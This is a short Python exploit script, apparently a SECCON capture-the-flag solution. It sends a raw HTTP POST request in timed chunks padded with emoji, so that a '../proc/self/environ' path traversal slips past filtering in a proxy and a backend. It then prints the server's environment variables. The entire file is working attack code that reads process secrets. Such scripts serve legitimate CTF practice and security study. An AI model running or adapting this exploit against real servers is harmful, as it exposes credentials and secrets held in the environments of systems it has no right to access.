import ptrlib
import time, os

io = ptrlib.Socket(
    os.getenv("SECCON_HOST", "localhost"),
    int(os.getenv("SECCON_PORT", 3000)),
)
io.debug = True

path = b"../proc/self/environ"

parts = path.split(b"..")
assert len(parts) >= 2

chunks = [parts[0] + b"."]
for part in parts[1:]:
    chunks.append("🦀".encode() * 6000)  # Split chunks in `backend`
    chunks.append(b"." + part)

length = sum([len(chunk) for chunk in chunks])

io.send(
    f"""
POST /file HTTP/1.1\r
Content-Length: {length}\r
Content-Type: text/plain\r
Host: localhost:3000\r
\r
""".lstrip().encode()
)

for chunk in chunks:
    io.send(chunk)
    time.sleep(1)  # Split chunks in `proxy`

environ = io.recvall(timeout=0.5).decode().strip()
for e in environ.split("\x00"):
    print(e)
